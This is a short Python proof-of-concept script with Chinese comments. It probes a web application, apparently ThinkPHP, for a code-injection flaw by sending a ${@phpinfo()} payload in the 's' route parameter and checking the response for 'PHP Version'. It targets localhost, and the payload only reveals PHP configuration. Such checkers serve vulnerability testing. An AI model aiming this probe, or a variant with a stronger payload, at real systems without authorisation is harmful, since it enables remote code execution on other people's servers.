#1.输入网站url
#2.打开存在恶意代码的url
#3.判断存不存在漏洞
import requests          #引用库

test_url = "http://localhost:8080/"
payload = r"index.php?s=/index/index/name/$%7B@phpinfo()%7D"
url = test_url + payload
r = requests.get(url)

keyword = "PHP Version"
good = r.text

jieguo = keyword in good 

if jieguo == True:
    print("[+]漏洞存在!")
else:
    print("[-]漏洞不存在!")